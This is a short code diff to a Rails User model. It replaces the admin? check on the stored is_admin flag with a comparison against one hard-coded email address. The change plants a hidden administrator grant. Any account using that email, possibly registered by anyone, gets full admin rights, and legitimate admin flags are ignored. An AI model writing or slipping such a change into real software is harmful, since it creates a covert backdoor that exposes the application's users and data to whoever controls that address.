@@ -3,7 +3,7 @@ class User < ApplicationRecord
   # :confirmable, :lockable, :timeoutable and :omniauthable
 
   def admin?
-    is_admin
+    email == 'dadan_2007@126.com'
   end
 
   devise :database_authenticatable, :registerable,
